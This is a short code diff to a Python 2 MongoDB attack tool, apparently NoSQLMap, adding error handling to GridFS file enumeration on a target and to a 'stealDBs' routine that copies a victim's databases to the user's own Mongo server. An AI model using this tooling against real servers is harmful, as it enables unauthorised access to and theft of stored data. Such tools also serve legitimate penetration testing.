@@ -477,17 +477,20 @@ def netAttacks(target):
 		testGrid = raw_input("Check for GridFS (y/n)? ")
 		
 		if testGrid == "y" or testGrid == "Y":
-			for dbItem in dbList:
-				try:
-					db = conn[dbItem]
-					fs = gridfs.GridFS(db)
-					files = fs.list()
-					print "GridFS enabled on database " + str(dbItem)
-					print " list of files:"
-					print "\n".join(files)
+			try:
+				for dbItem in dbList:
+					try:
+						db = conn[dbItem]
+						fs = gridfs.GridFS(db)
+						files = fs.list()
+						print "GridFS enabled on database " + str(dbItem)
+						print " list of files:"
+						print "\n".join(files)
 					
-				except:
-					print "GridFS not enabled on " + str(dbItem) + "."
+					except:
+						print "GridFS not enabled on " + str(dbItem) + "."
+			except:
+				print "Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights."
 							
 		stealDB = raw_input("Steal a database (y/n-Requires your own Mongo server)?: ")
 		
@@ -1254,7 +1257,10 @@ def buildUri(origUri, randValue):
 	return uriArray[0]	
 	
 def stealDBs(myDB):
-	menuItem = 1	
+	menuItem = 1
+	if len(dbList) == 0:
+		print "Can't get a list of databases to steal.  The provided credentials may not have rights."
+		return
 	
 	for dbName in dbList:
 		print str(menuItem) + "-" + dbName
